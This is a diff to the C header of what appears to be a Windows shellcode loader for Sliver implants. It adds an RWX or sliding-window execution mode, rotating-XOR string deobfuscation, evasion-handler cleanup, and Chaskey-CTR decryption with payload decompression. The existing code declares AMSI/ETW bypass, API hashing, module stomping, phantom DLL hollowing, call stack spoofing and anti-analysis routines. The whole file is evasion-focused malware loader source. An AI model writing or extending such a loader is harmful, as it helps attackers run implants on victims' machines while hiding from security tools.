@@ -13,6 +13,19 @@
 // Uncomment for debug output (log file)
 // #define DEBUG
 
+// Uncomment for Go-based shellcode (Sliver) that writes to own pages.
+// When defined: memory is PAGE_EXECUTE_READWRITE, sliding window disabled.
+// When not defined: memory is PAGE_EXECUTE_READ (W^X), sliding window available.
+// #define RWX_SHELLCODE
+
+// Uncomment to enable sliding execution window (per-page on-demand decryption).
+// Incompatible with RWX_SHELLCODE — forces PAGE_EXECUTE_READ.
+// #define SLIDING_WINDOW
+
+#if defined(SLIDING_WINDOW) && defined(RWX_SHELLCODE)
+#error "SLIDING_WINDOW and RWX_SHELLCODE are mutually exclusive"
+#endif
+
 // Subsystem is controlled by build.bat LFLAGS (/SUBSYSTEM:WINDOWS)
 
 // ----------- Debug Logging -----------
@@ -59,7 +72,6 @@
 #define VirtualProtect_JOAAT            0x69B260D2
 #define EtwEventWrite_JOAAT             0xEF9B6F9B
 #define AmsiScanBuffer_JOAAT            0x725879AF
-#define SystemFunction032_JOAAT         0xBAE9A924
 
 // ----------- NT Status Codes -----------
 #ifndef NT_SUCCESS
@@ -70,8 +82,14 @@
 #define STATUS_SINGLE_STEP  0x80000004L
 #endif
 
+// ----------- Memory Protection Helpers -----------
+#ifdef RWX_SHELLCODE
+    #define SHELLCODE_EXEC_PROT  PAGE_EXECUTE_READWRITE
+#else
+    #define SHELLCODE_EXEC_PROT  PAGE_EXECUTE_READ
+#endif
+
 // ----------- Function Typedefs -----------
-typedef NTSTATUS(NTAPI* fnSystemFunction032)(PUSTRING Data, PUSTRING Key);
 typedef HMODULE (WINAPI* fnLoadLibraryA)(LPCSTR lpLibFileName);
 typedef FARPROC (WINAPI* fnGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
 typedef HMODULE (WINAPI* fnGetModuleHandleA)(LPCSTR lpModuleName);
@@ -84,6 +102,7 @@ typedef VOID    (NTAPI* fnTpReleaseWork)(PVOID Work);
 
 // Patchless evasion typedefs (ntdll exports)
 typedef PVOID   (NTAPI* fnRtlAddVectoredExceptionHandler)(ULONG First, PVOID Handler);
+typedef ULONG   (NTAPI* fnRtlRemoveVectoredExceptionHandler)(PVOID Handle);
 typedef VOID    (NTAPI* fnRtlCaptureContext)(PCONTEXT ContextRecord);
 typedef NTSTATUS(NTAPI* fnNtContinue)(PCONTEXT ThreadContext, BOOLEAN RaiseAlert);
 
@@ -107,9 +126,10 @@ typedef struct _API_HASHING {
 #define MemCopy(dest, src, size)    __movsb((PBYTE)(dest), (const BYTE*)(src), (size))
 #define MemSet(dest, val, size)     __stosb((PBYTE)(dest), (BYTE)(val), (size))
 
-// ----------- String Deobfuscation -----------
-// XKEY is defined in Payload.h (randomized per build by Encrypt.py)
-#define DEOBF(buf) do { for(DWORD _xi=0; (buf)[_xi]; _xi++) (buf)[_xi] ^= XKEY; } while(0)
+// ----------- String Deobfuscation (4-byte rotating XOR) -----------
+// XKEY_0..XKEY_3 are defined in Payload.h (randomized per build by Encrypt.py)
+static const BYTE g_XorKey[4] = { XKEY_0, XKEY_1, XKEY_2, XKEY_3 };
+#define DEOBF(buf) do { for(DWORD _xi=0; (buf)[_xi]; _xi++) (buf)[_xi] ^= g_XorKey[_xi & 3]; } while(0)
 
 // ----------- Helper Functions -----------
 UINT32 HashStringJenkinsOneAtATime32BitA(IN PCHAR String);
@@ -128,11 +148,17 @@ VOID IatCamouflage(VOID);
 
 // ----------- Evasion -----------
 BOOL PatchlessAmsiEtw(IN PAPI_HASHING pApi);
+VOID CleanupEvasion(IN PAPI_HASHING pApi);
 BOOL AntiAnalysis(VOID);
 
 // ----------- Module Stomping / Phantom DLL Hollowing -----------
 BOOL ModuleStomp(IN PAPI_HASHING pApi, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);
 BOOL PhantomDllHollow(IN PAPI_HASHING pApi, IN PNTAPI_FUNC pNtApis, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);
+
+// ----------- Sliding Execution Window -----------
+#ifdef SLIDING_WINDOW
+BOOL ActivateSlidingWindow(IN PAPI_HASHING pApi, IN PVOID pExecBase, IN DWORD dwSize);
+#endif
 
 // ----------- Call Stack Spoofing (ASM) -----------
 extern VOID SetSpoofTarget(PVOID pTarget, PVOID pCallGadget);
@@ -142,7 +168,8 @@ extern VOID SpoofCallback(PVOID Instance, PVOID Context, PVOID Work);
 PVOID FindCallGadget(IN PVOID pModuleBase);
 
 // ----------- Crypto -----------
-BOOL Rc4DecryptPayload(IN PAPI_HASHING pApi, IN PBYTE pCipherText, IN DWORD dwCipherSize, IN PBYTE pKey, IN DWORD dwKeySize);
+BOOL ChaskeyCtrDecrypt(IN PBYTE pData, IN DWORD dwSize, IN PBYTE pKey, IN PBYTE pNonce);
+BOOL DecompressPayload(IN PAPI_HASHING pApi, IN PBYTE pCompressed, IN DWORD dwCompressedSize, OUT PBYTE* ppDecompressed, IN DWORD dwOriginalSize);
 BOOL BruteForceDecryption(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sKeySize, OUT PBYTE* ppRealKey);
 
 // ----------- Staging -----------
